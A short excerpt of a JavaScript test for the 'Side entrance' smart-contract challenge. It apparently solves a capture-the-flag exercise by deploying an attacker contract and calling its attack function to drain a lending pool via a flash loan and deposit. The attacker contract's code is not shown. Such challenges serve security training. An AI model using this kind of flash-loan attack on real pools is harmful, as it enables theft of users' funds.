...
describe("[Challenge] Side entrance", function () {
  ...
  it("Exploit", async function () {
    ...
    const factoryAttackerContract = await ethers.getContractFactory(
      "SideEntranceAttackerContract",
      attacker
    );
    this.attakerContract = await factoryAttackerContract.deploy(this.pool.address);

    //take flash loan and deposit funds from contract
    await this.attakerContract.attack(ETHER_IN_POOL);
